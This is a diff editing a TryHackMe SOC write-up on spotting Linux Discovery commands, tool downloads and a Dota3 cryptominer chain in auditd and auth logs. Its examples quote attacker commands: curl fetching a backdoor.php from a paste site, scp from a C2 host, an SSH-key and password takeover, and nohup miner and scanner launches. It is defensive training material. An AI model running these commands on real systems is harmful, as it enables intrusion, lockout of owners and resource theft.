@@ -5,8 +5,8 @@ path: SOC Level 1
 platform: TryHackMe
 tags: [linux, threat-detection, discovery, ingress-tool-transfer, cryptominer, dota3, auditd, mitre]
 status: completed
-date:2026-07-01
-date_completed:2026-07-02
+date: 2026-07-01
+date_completed: 2026-07-02
 ---
 
 *Write-up by [Miyu7x](https://github.com/Miyu7x) | TryHackMe: [Miyu7](https://tryhackme.com/p/Miyu7) | BTLO: [Miyu7x](https://blueteamlabs.online/public/user/Miyu7x)*
@@ -34,18 +34,19 @@ How can SOCs detect their actions, by investigating Discovery commands in logs?
 
 ### Discovery
 
-The majority of Linux breaches happen by to be intiated by automated botnets, the attacker is notified, his command center is just the bash.
+The majority of Linux breaches happen to be initiated by automated botnets. The attacker is notified, and the attacker's command center is just the bash.
+
 <p align="center">
 <img src=screenshots/linux2_botnet.png width="700">
 </p>
 
 ### First Actions
 
-The starting commands attacker use once they have acces to the systems bash are usually the same:
+The starting commands attackers use once they have access to the system's bash are usually the same:
   - Who am I? Where am I? What privileges do I have?
-  - Attackers use the same commands IT Teams across the world are constantly using, how do you distinguish?
-  - whoami is a command thats always suspisicous
-    
+  - Attackers use the same commands IT teams across the world are constantly using, so how do you distinguish?
+  - whoami is a command that's always suspicious to see in isolation, especially from an unexpected parent process
+
 | Discovery Goal | Typical Commands |
 |---|---|
 | OS and Filesystem Discovery | pwd, ls /, env, uname -a, lsb_release -a, hostname |
@@ -60,7 +61,8 @@ The starting commands attacker use once they have acces to the systems bash are 
 <p align="center">
 <img src=screenshots/linux2_amazon.png width="700">
 </p>
-An attacker in **Discovery Phase** will run commands to get a lay of the land, the command: **systemd-detect-virt** , in this case returned Amazon, the attacker is hunting information about the network and its cloud system.
+
+An attacker in the **Discovery Phase** will run commands to get a lay of the land. The command **systemd-detect-virt**, in this case, returned Amazon, telling the attacker information about the network and its cloud provider.
 
 **Answer: Amazon**
 
@@ -71,6 +73,7 @@ An attacker in **Discovery Phase** will run commands to get a lay of the land, t
 <p align="center">
 <img src=screenshots/linux2_malscan.png width="700">
 </p>
+
 During the attacker's discovery phase, they need to know which processes are currently running on a system so they can determine what security measures they're up against.
 
 **Answer: /var/lib/ultrasec/malscan**
@@ -85,7 +88,7 @@ After **Initial Discovery**, attackers can then decide their next move:
   - Data stealers look for passwords and secrets to collect
   - Crypto miners query for CPU and GPU info to optimize mining
   - Botnet scripts scan the network for new victims
-  - Some malware combines all of the above...
+  - Some malware combines all of the above
 
 | Attack Objectives | Typical Commands |
 |---|---|
@@ -95,11 +98,11 @@ After **Initial Discovery**, attackers can then decide their next move:
 
 ### Detecting Discovery
 
-Using Auditd, you can configure the rules to log specific commands to hunt for Discovery using a SIEM ausearch
-  - How do you know which commands are regular IT work, legitimate service or which could be from an attacker?
-  - Web server suddenly spawns **whoami**
-  - IT members using commands such as **find** and **grep** for secrets
-  - A legitimate monitoring tool that periodically uses **ping**
+Using Auditd, you can configure rules to log specific commands, then hunt for Discovery activity using a SIEM or ausearch.
+  - How do you know which commands are regular IT work, a legitimate service, or an attacker?
+  - A web server suddenly spawning **whoami** is a red flag
+  - IT members legitimately use commands such as **find** and **grep** for secrets during normal work
+  - A legitimate monitoring tool may periodically use **ping**
 
 **Example: Steps to Detect Discovery**
 <p align="center">
@@ -131,7 +134,8 @@ Can you continue the investigation on the VM and find out what really happened?
 <p align="center">
 <img src=screenshots/linux2_hostname.png width="700">
 </p>
-We are looking for the parent process that initiated hostname. We ran ausearch -i -x hostname and found ppid=3771 and pid=3772 (hostname's own PID). Since 3771 is the PID of the parent process, we searched ausearch -i --pid 3771 to identify what that process was. This revealed proctitle=bash debug.sh with cwd=/home/itsupport
+
+We are looking for the parent process that initiated hostname. We ran `ausearch -i -x hostname` and found `ppid=3771` and `pid=3772` (hostname's own PID). Since 3771 is the PID of the parent process, we searched `ausearch -i --pid 3771` to identify what that process was. This revealed `proctitle=bash debug.sh` with `cwd=/home/itsupport`.
 
 **Answer: /home/itsupport/debug.sh**
 
@@ -142,7 +146,12 @@ We are looking for the parent process that initiated hostname. We ran ausearch -
 <p align="center">
 <img src=screenshots/linux2_lastdiscovery.png width="700">
 </p>
-Searching for the commands ran by the script debug.sh we investigate the process tree with **ausearch -i --ppid3771** the last **Discovery** command we observeL type=PROCTITLE msg=audit(09/11/25 18:29:48.965:1130) : proctitle=ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu
+
+Searching for the commands run by the script debug.sh, we investigated the full process tree with `ausearch -i --ppid 3771`. Reading through the results by timestamp, the last genuine **Discovery** command observed was:
+
+`type=PROCTITLE msg=audit(09/11/25 18:29:48.965:1130) : proctitle=ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu`
+
+A `head -n 10` call appears immediately after this in the logs with a later timestamp, but it is only trimming the ps output to its top 10 lines rather than performing any discovery of its own, so it doesn't count as a separate Discovery command.
 
 **Answer: ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu**
 
@@ -153,10 +162,13 @@ Searching for the commands ran by the script debug.sh we investigate the process
 <p align="center">
 <img src=screenshots/linux2_thmemail.png width="700">
 </p>
-Lets read the script file with the path we discovered earlier: sudo cat /home/itsupport/debug.sh
-We can see the entire script, including the last command the script runs which we observed in th eprevious question:
+
+Let's read the script file directly using the path we discovered earlier: `sudo cat /home/itsupport/debug.sh`. We can see the entire script, including the last command it runs, which we already identified in the previous question:
+
+```
 echo "--- Top CPU-consuming processes ---"
 ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head -n 10
+```
 
 **Answer: greg@tryhackme.thm**
 
@@ -166,11 +178,11 @@ ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head -n 10
 
 ### "Hack and Forget" Attacks
 
-Linux attacks are broken down in two categories:
-  - Hack and Forget: quick gains, botnets, use as proxy...
+Linux attacks are broken down into two categories:
+  - Hack and Forget: quick gains, botnets, used as a proxy
   - Targeted Attacks
 
-Attackers use **Ingress Tool Transfer** MITRE teachinique T1105, to continue to attack their victim.
+Attackers use **Ingress Tool Transfer**, MITRE technique T1105, to continue attacking their victim.
 
 ### Ingress Tool Transfer
 
@@ -180,9 +192,8 @@ Attackers use **Ingress Tool Transfer** MITRE teachinique T1105, to continue to 
 | Curl: Make a request to the webpage | curl --output /var/www/html/backdoor.php "https://pastebin.thm/yTg0Ah6a" |
 | SSH: Transfer a file via SCP or SFTP | scp kali@c2server:/home/kali/cve-2021-4034.sh /tmp/cve-2021-4034.sh |
 
-These **commands** can all be logged with auditd, and can sometimes appear in Bash history, but smart attackers dont let their commands be logged.
-If the attacker is running the operation through SSH there will be no vbisible logs in the victims system. There will be a **visible SSH login**
-This also runs true with FTP and SMB.
+These commands can all be logged with auditd and can sometimes appear in bash history, but smart attackers don't let their commands get logged.
+If the attacker is running the operation through SSH, there will be no visible logs of the transfer commands themselves on the victim's system, but there will be a **visible SSH login**. The same holds true for FTP and SMB.
 
 **Example: Option 1 -- Attacker Connects to Victim**
 ```
@@ -208,22 +219,21 @@ ubuntu@thm-vm:~$ scp attacker@attack-vm:./malware.sh /tmp
 
 ### Additional Detection
 
-**Auditd** offers view on process creation events
+**Auditd** offers a view into process creation events.
 
-Authentication logs for suspicious SSH logins
+Authentication logs help identify suspicious SSH logins.
 
 Ingress Tool Transfer Detection:
-  
+
   - Network Traffic
       - Downloads from a suspicious IP
-      - Downloads from suspicious domain such as qfpkvwgq.thm
-      - Downloads from public services knwon to host attack tools like GitHub
+      - Downloads from a suspicious domain such as qfpkvwgq.thm
+      - Downloads from public services known to host attack tools, like GitHub
   - File Events
       - Newly created file in temp folders: /tmp or /var/tmp
-      - Newly created file named: exploit, shell.php or kF1pBsY5
+      - Newly created file named: exploit, shell.php, or kF1pBsY5
   - Antivirus Alerts
       - EDR or antivirus alert triggering on a new malicious file or process
-
 
 ---
 
@@ -232,7 +242,9 @@ Ingress Tool Transfer Detection:
 <p align="center">
 <img src=screenshots/linux2_elasticdomain.png width="700">
 </p>
-When searching for where downloaded files came from on the internet, we can start by using the **wget** argument to find them. This will provide us with information on the domain, this is helpful to know if the file is legitimate or if it comes from a suspicious website.
+
+When searching for where downloaded files came from, we can start with the **wget** command, since its arguments include the source URL. This tells us the domain, which helps confirm whether the file is legitimate or came from a suspicious site.
+
 Command: **sudo ausearch -i -x wget**
 
 **Answer: artifacts.elastic.co**
@@ -244,8 +256,11 @@ Command: **sudo ausearch -i -x wget**
 <p align="center">
 <img src=screenshots/linux2_curldl.png width="700">
 </p>
-There is two different ways to see downloaded files, one was **wget** we just used we did not observe any helper.sh scripts downloaded, so we use the next option which is **curl**. 
+
+There are two common ways to spot downloaded files. We already checked **wget** and didn't observe any helper.sh script there, so we check the next option, **curl**.
+
 Command: **sudo ausearch -i -x curl**
+
 We observe the file being downloaded to: /var/tmp/helper.sh
 
 **Answer: /var/tmp/helper.sh**
@@ -254,7 +269,7 @@ We observe the file being downloaded to: /var/tmp/helper.sh
 
 3. Which of the downloaded files is more likely to be malicious: the one downloaded with curl or wget?
 
-From the previous question we learned the Elastic agent was downloaded from a legitimate domain. The curl file is suspicious because of two main factors: drobbox-online.thm seems to be mimicking the real dropbox domain, and the file was downloaded to the tmp folder, which attackers like using because these tmp folders do not require privilages.
+From the previous question, we learned the Elastic agent was downloaded from a legitimate domain. The curl file is suspicious for two main reasons: drobbox-online.thm appears to be mimicking the real Dropbox domain, and the file was downloaded to the /tmp folder, which attackers favor since it typically doesn't require elevated privileges to write to.
 
 **Answer: curl**
 
@@ -264,22 +279,21 @@ From the previous question we learned the Elastic agent was downloaded from a le
 
 ### Dota 3 Malware Analysis
 
-In the real-world what do these infections look-like?
+In the real world, what do these infections actually look like?
 
 ### Initial Access
 
 **Example:**
-- The botnet of more than 2000 distinct IPs across 94 countries scans the Internet for systems with open SSH
+- A botnet of more than 2000 distinct IPs across 94 countries scans the internet for systems with open SSH
 - The botnet brute-forces the systems, mainly targeting the root user and trying the top 1000 weak passwords
-- If the password was guessed, one of the botnet hosts accesses the victim via SSH and continues the attack
-
+- If the password is guessed, one of the botnet hosts accesses the victim via SSH and continues the attack
 
 ### Discovery
 
-With the SSH session **active** the attacker will automate by quickly running multiple Discovery commands.
+With the SSH session **active**, the attacker automates the process by quickly running multiple Discovery commands.
 
 **Example: Cryptominer Infection**
-  - We can deduce its a cryptominer malware as, there is no other reason an attacker would run discovery commands to find info about CPU and RaM
+  - We can deduce this is cryptominer malware, since there's no other reason an attacker would run discovery commands to find info about CPU and RAM
 
 ```bash
 # Checks CPU and RAM information
@@ -297,9 +311,9 @@ uname -m
 ### Persistence
 
 We can observe **Persistence** actions:
-  - First command changes the password(in case another botnet tries to takeover)
-  - Following commands replaces all SSH keys with malicious ones(locks out system owner from accessing the server)
-  - This will ensure that access to the vicitm is maintained by the attacker
+  - The first command changes the password (in case another botnet tries to take over)
+  - The following commands replace all SSH keys with malicious ones (locking the system owner out of the server)
+  - This ensures the attacker maintains access to the victim
 
 ```bash
 echo -e "ubuntu123\nN2a96PU0mBfS\nN2a96PU0mBfS"|passwd|bash >> up.txt
@@ -311,14 +325,12 @@ echo "ssh-rsa [ssh-key] mdrfckr" >> .ssh/authorized_keys
 chmod -R go= ~/.ssh
 ```
 
-
-
 ### Detecting the Attack
 
-Weak SSH passwords remains a main reason why many Linux systems get breached everyday.
-  - If you had a SIEM you would receive multiple alerts regarding SSH and logins
+Weak SSH passwords remain a leading reason Linux systems get breached daily.
+  - If you had a SIEM, you would receive multiple alerts regarding SSH and logins
       - Spike in Discovery commands
-      - Match the attack string 
+      - Match against known attack strings
 
 | Log Source | Description |
 |---|---|
@@ -327,9 +339,9 @@ Weak SSH passwords remains a main reason why many Linux systems get breached eve
 
 ---
 
-For this task, try detecting a similar cryptominer infection chain in the VM!
+For this task, try detecting a similar cryptominer infection chain on the VM.
 Open the /home/ubuntu/scenario folder and use the logs inside to answer the questions.
-Please note that auditd logs can be viewed as ausearch -i -if /home/ubuntu/scenario/audit.log
+Note that the auditd logs here can be viewed with `ausearch -i -if /home/ubuntu/scenario/audit.log`.
 
 ---
 
@@ -338,8 +350,12 @@ Please note that auditd logs can be viewed as ausearch -i -if /home/ubuntu/scena
 <p align="center">
 <img src=screenshots/linux2_exposedssh.png width="700">
 </p>
-When searching for Brute-Force attacks we can observe multiple failed logins one after another, to find eveidence of this attack we can investigate the **Authorization Logs** located in /var/log/auth.log in order to filter for better visbility we can search the logs for "Failed" SSH login attempts.
-Command: **grep -a "Failed" /var/log/auth.log** - I then confirmed with the exact IP by looking at the "Accepted" logins.
+
+When searching for brute-force attacks, we look for multiple failed logins in a row from the same source, targeting the same user, in a short time window. To find evidence of this, we investigate the **Authorization Logs** at `/home/ubuntu/scenario/auth.log`, filtering for "Failed" SSH login attempts.
+
+Command: **grep -a "Failed" /home/ubuntu/scenario/auth.log**
+
+This revealed repeated failed password attempts against the root account from a single IP. We then confirmed it was the successful brute-force source by cross-referencing that same IP against the "Accepted" logins, where it appeared logging in successfully as root shortly after the failed attempts.
 
 **Answer: 45.9.148.125**
 
@@ -350,7 +366,12 @@ Command: **grep -a "Failed" /var/log/auth.log** - I then confirmed with the exac
 <p align="center">
 <img src=screenshots/linux2_last.png width="700">
 </p>
-Command: sudo ausearch -i -if /home/ubuntu/scenario/audit.log | grep "last"
+
+To narrow down the noise, we filter the audit log to just EXECVE records (which contain the actual command and arguments as plain text) and then search within those for command names related to login history.
+
+Command: **sudo ausearch -i -if /home/ubuntu/scenario/audit.log | grep "type=EXECVE" | grep "last"**
+
+This surfaced the command `last`, which lists the system's most recent login history, confirming this as the tool the attacker used to check for other users who had recently accessed the box.
 
 **Answer: last**
 
@@ -362,6 +383,12 @@ Command: sudo ausearch -i -if /home/ubuntu/scenario/audit.log | grep "last"
 <img src=screenshots/linux2_falcon.png width="700">
 </p>
 
+Filtering the same way (EXECVE records containing "egrep") surfaced several egrep calls. Most were unrelated system checks (filesystem mount types, for example), but one stood out for its distinct pattern of three tool-like names joined with pipes rather than filesystem paths:
+
+`type=EXECVE msg=audit(09/11/25 21:13:37.725:2129) : argc=4 a0=/bin/sh a1=/usr/bin/egrep a2=--color=auto a3=falcon|sentinel|ds_agent`
+
+This is the attacker checking running processes for known EDR/antivirus agent names (CrowdStrike Falcon, SentinelOne, and Trend Micro's Deep Security Agent) before continuing, a Defense Evasion step to confirm they weren't being monitored.
+
 **Answer: ds_agent,falcon,sentinel**
 
 ---
@@ -370,7 +397,7 @@ Command: sudo ausearch -i -if /home/ubuntu/scenario/audit.log | grep "last"
 
 ### Cryptominer Setup
 
-Following the infection chain, since the attackers have maintained presencem they have SSH access, what is their next move?
+Following the infection chain, since the attackers have maintained persistence and SSH access, what is their next move?
   - Install additional malware?
   - Upload tools via SCP using the previously changed password?
 
@@ -380,10 +407,10 @@ user@bot-1672$ scp dota3.tar.gz ubuntu@victim:/tmp
 [OK] Transfered dota3.tar.gz file to the victim
 ```
 
-As we see above the attackers transfered the tools: **dota3.tar.gz**
-  - Next the attackers unpack them in a hidden folder inside the /tmp folder
-  - The attackers will name the directories to make them seem like real legitamte software such as: .X26-unix
-      - This can make SOCs overlook the malicious file as the name seems legit
+As shown above, the attackers transferred the tool: **dota3.tar.gz**
+  - Next, the attackers unpack it in a hidden folder inside /tmp
+  - The attackers name the directories to look like legitimate software, such as **.X26-unix**
+      - This can make SOCs overlook the malicious files, since the name appears legitimate
 
 ```bash
 # Prepare a hidden /tmp/.X26-unix folder for malware
@@ -396,10 +423,11 @@ tar xf dota3.tar.gz
 sleep 3s
 cd /tmp/.X26-unix/.rsync/c
 ```
-Lastly the attackers here execute two binaries: **tsm** and **initall**
+
+Lastly, the attackers execute two binaries: **tsm** and **initall**
   - tsm is a custom network scanner that probes the internal network for other exposed SSH services
-  - initall is a XMRig cryptominer
-      - both binaries were launched with **nohup** which allows proccesses to run in the background, even if SSH closes!
+  - initall is an XMRig cryptominer
+      - Both binaries are launched with **nohup**, which allows processes to keep running in the background even after the SSH session closes
 
 ```bash
 # Scan the internal network with the "tsm" malware
@@ -413,18 +441,15 @@ cd ..; nohup /tmp/.X26-unix/.rsync/initall 2>1&
 exit 0
 ```
 
-
-
 ### Detecting the Attack
 
-Some common rules EDR are usually loaded with:
+Some common rules EDRs are usually loaded with:
 
 Auditd logs: Creation of untrusted, hidden files and folders in the /tmp directory
 Auditd logs: Creation of files named like known malware, such as dota3.tar.gz
 Auditd logs: Usage of commands often observed in attacks, such as nohup
-Network traffic: SSH port scan of the whole 192.168.* and 172.16.* networks
-EDR solution: The XMrig cryptominer binary is blocked by most EDRs (VirusTotal Example(opens in new tab))
-
+Network traffic: SSH port scans across whole 192.168.* and 172.16.* ranges
+EDR solution: The XMRig cryptominer binary is blocked by most EDRs (VirusTotal Example(opens in new tab))
 
 ---
 
@@ -433,8 +458,10 @@ EDR solution: The XMrig cryptominer binary is blocked by most EDRs (VirusTotal E
 <p align="center">
 <img src=screenshots/linux2_kernedup.png width="700">
 </p>
-Since transfered files usually end up in the /tmp folder I decided to look there first.
-Command: **sudo ausearch -i -if /home/ubuntu/scenario/audit.log | grep 'tmp'** 
+
+Since transferred files usually end up in the /tmp folder, we start our search there.
+
+Command: **sudo ausearch -i -if /home/ubuntu/scenario/audit.log | grep 'tmp'**
 
 **Answer: kernupd.tar.gz**
 
@@ -445,8 +472,10 @@ Command: **sudo ausearch -i -if /home/ubuntu/scenario/audit.log | grep 'tmp'**
 <p align="center">
 <img src=screenshots/linux2_kernedup.png width="700">
 </p>
-While investigating the /tmp results, I spotted the **nohup** which launches binaries. 
-type=PROCTITLE msg=audit(09/11/25 21:16:08.668:2338) : proctitle=nohup /tmp/.apt/kernupd/kernupd
+
+While investigating the /tmp results, we spotted **nohup**, which is used to launch binaries so they persist after the SSH session ends:
+
+`type=PROCTITLE msg=audit(09/11/25 21:16:08.668:2338) : proctitle=nohup /tmp/.apt/kernupd/kernupd`
 
 **Answer: nohup /tmp/.apt/kernupd/kernupd**
 
@@ -457,7 +486,8 @@ type=PROCTITLE msg=audit(09/11/25 21:16:08.668:2338) : proctitle=nohup /tmp/.apt
 <p align="center">
 <img src=screenshots/linux2_nohup.png width="700">
 </p>
-Since **nohup** launches the binary I thought lets look for that command exactly with **proctitle=nohup** to filter out all the commands run by that binary...
+
+Since nohup was used to launch the scanning binary, we filtered specifically for `proctitle=nohup` entries to isolate every command run through it. This surfaced the network scanner's arguments, which included the target IP range it swept for exposed SSH services.
 
 **Answer: 10.10.12.1-10.10.12.10**
 
@@ -466,8 +496,6 @@ Since **nohup** launches the binary I thought lets look for that command exactly
 ## Task 7 -- Conclusion
 
 ### Key Takeaways
-
-
 
 ---
 
